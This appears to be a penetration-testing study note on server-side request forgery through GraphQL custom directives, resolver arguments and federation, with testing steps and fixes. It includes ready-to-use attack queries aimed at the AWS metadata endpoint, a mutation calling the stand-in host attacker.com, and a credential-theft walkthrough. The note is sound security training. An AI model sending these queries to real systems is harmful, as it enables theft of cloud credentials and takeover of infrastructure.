---
tags: [vapt, graphql, ssrf, directives, cloud-security]
difficulty: advanced
module: "30 - GraphQL Security"
topic: "30.12 GraphQL SSRF via Directives"
---

# 30.12 — GraphQL SSRF via Directives

## What is it?
Server-Side Request Forgery (SSRF) occurs when an application is forced to make an HTTP request to an attacker-controlled destination (either external or internal). 

In modern architectures, GraphQL is rarely connected directly to a monolithic database. Instead, it acts as an **API Gateway**, sitting in front of dozens of microservices. The GraphQL server accepts the query, and the resolvers make internal HTTP requests to backend REST APIs (e.g., fetching user data from `http://internal-user-service:8080`).

Because of this architectural pattern, GraphQL servers are highly susceptible to SSRF if the inputs determining *where* the backend fetches data are improperly validated. This is frequently introduced through misconfigured **GraphQL Directives** or vulnerable resolver arguments.

## Attack Vectors

### 1. SSRF via Custom Directives
GraphQL Directives (e.g., `@include`, `@skip`) allow clients to dynamically alter the execution of a query. Many organizations build *custom* directives to simplify fetching data from legacy REST systems. A common example is an `@rest` or `@fetch` directive that tells the GraphQL engine to grab data from a specific URL.

**Vulnerable Schema / Usage:**
```graphql
query {
  user(id: 1) {
    name
    profileHtml @rest(url: "http://internal-cms.local/profiles/1.html")
  }
}
```

**The Attack:** 
If the API allows the client to supply arbitrary URLs to the `@rest` directive, the attacker achieves full SSRF. They simply change the URL to target internal infrastructure or cloud metadata endpoints.

**Attacker Request:**
```graphql
query {
  user(id: 1) {
    name
    profileHtml @rest(url: "http://169.254.169.254/latest/meta-data/iam/security-credentials/")
  }
}
```
The GraphQL server makes a GET request to the AWS metadata IP, retrieves the temporary IAM credentials, and returns them to the attacker in the `profileHtml` JSON field.

### 2. SSRF via Resolver Arguments
Even without custom directives, resolvers themselves often take URLs or filenames as arguments, particularly for webhooks, avatar fetching, or PDF generation.

**Vulnerable Query:**
```graphql
mutation {
  generateReport(templateUrl: "http://attacker.com/malicious.html") {
    status
    pdfUrl
  }
}
```

**The Attack:**
If the resolver fetches the `templateUrl` without verifying that it points to an approved domain, the attacker can supply internal IP addresses. By checking the `status` or response times, the attacker can perform internal port scanning (Blind SSRF) or retrieve internal data (Full SSRF).

### 3. SSRF via Batching / Federation
GraphQL Federation (like Apollo Federation) splits a single schema across multiple subgraphs. The central Gateway server parses the query and sends chunks of it to the subgraphs. If the Gateway routing logic is flawed or allows the client to manipulate `_Any` types or internal routing headers, the Gateway can be tricked into proxying requests to arbitrary internal services, a highly complex form of SSRF unique to GraphQL.

## Visualizing GraphQL SSRF

```text
========================================================================================
                          GRAPHQL AS AN SSRF PROXY
========================================================================================

  [ Attacker ]
       |
       |  query { fetchData @rest(url: "http://169.254.169.254") }
       |-----------------------------------------------------------> [ GraphQL Gateway ]
                                                                             |
                                     (Evaluates @rest directive)             |
                                     (Makes outbound HTTP GET) <-------------+
                                                                             |
                                                                             v
                                                               [ AWS IMDS (169.254.169.254) ]
                                                                             |
                                     { "AccessKeyId": "AKIA..." } <----------+
                                                                             |
       |  { "data": { "fetchData": "{ \"AccessKeyId\": \"AKIA...\" }" } }
       |<---------------------------------------------------------- [ GraphQL Gateway ]
       |
  [ Steals IAM Credentials ]

========================================================================================
```

## How to Test for GraphQL SSRF
1. **Introspection for Directives:** Send an introspection query and carefully examine the `directives` array. Look for custom directives like `@rest`, `@http`, `@fetch`, or `@export`. If they accept `url`, `endpoint`, or `path` arguments, immediately test them for SSRF.
2. **Analyze Arguments:** Look for mutations or queries that accept URLs. Typical targets include `webhookUrl`, `avatarUrl`, `importFrom`, or `generatePdf`.
3. **Out-of-Band Testing:** Supply a Burp Collaborator or interactsh URL to these arguments. Monitor your DNS/HTTP logs. If the GraphQL server connects back to your Collaborator payload, you have confirmed SSRF.
4. **Cloud Metadata Exploitation:** Once SSRF is confirmed via out-of-band testing, point the URL at `169.254.169.254` (AWS/GCP/Azure) or `127.0.0.1:2375` (Docker Daemon) to escalate from Blind SSRF to Critical Impact.

## Real-World Example
An application allowed users to import their profile pictures from an external URL via a GraphQL mutation:
`mutation { setAvatar(url: "https://example.com/image.jpg") { success } }`

A researcher pointed the URL to their Burp Collaborator and received an HTTP GET request, confirming Blind SSRF. They then pointed the URL to the internal AWS Metadata Service:
`mutation { setAvatar(url: "http://169.254.169.254/latest/meta-data/") { success } }`

The application responded with `{"data": {"setAvatar": {"success": true}}}`. Because it was Blind SSRF, the metadata was not returned in the JSON response. However, the researcher noticed another query: `query { me { avatarUrl } }`. By executing this query, they found that the application had saved the *contents* of the metadata endpoint into their avatar image field, allowing them to read the AWS IAM credentials and take over the cloud infrastructure.

## How to Fix It
- **Strict Allowlists:** If a directive or resolver must fetch data from a URL, the URL must be strictly validated against a hardcoded allowlist of approved domains. Regex validation is often insufficient and easily bypassed.
- **Network Segmentation:** The GraphQL server should run in a restricted subnet (e.g., a locked-down VPC) that prevents it from accessing the cloud metadata service (`169.254.169.254`) or internal administrative subnets.
- **Disable Arbitrary Directives:** Clients should rarely be allowed to dictate internal routing via `@rest` directives. If these directives exist, their usage should be heavily restricted and validated on the server side.

## Chaining Opportunities
- This vuln + [[19 - SSRF to Cloud Credential Theft]] → The ultimate goal of finding an SSRF in a cloud-hosted GraphQL API is stealing IAM or Kubernetes tokens.
- This vuln + [[04 - GraphQL Enumeration (clairvoyance, graphql-cop)]] → Because custom directives are often poorly documented, utilizing deep enumeration or introspection is the only way to discover the `@rest` or `@fetch` functionalities.

## Related Notes
- [[01 - SSRF (Server-Side Request Forgery)]]
- [[01 - What is GraphQL?]]
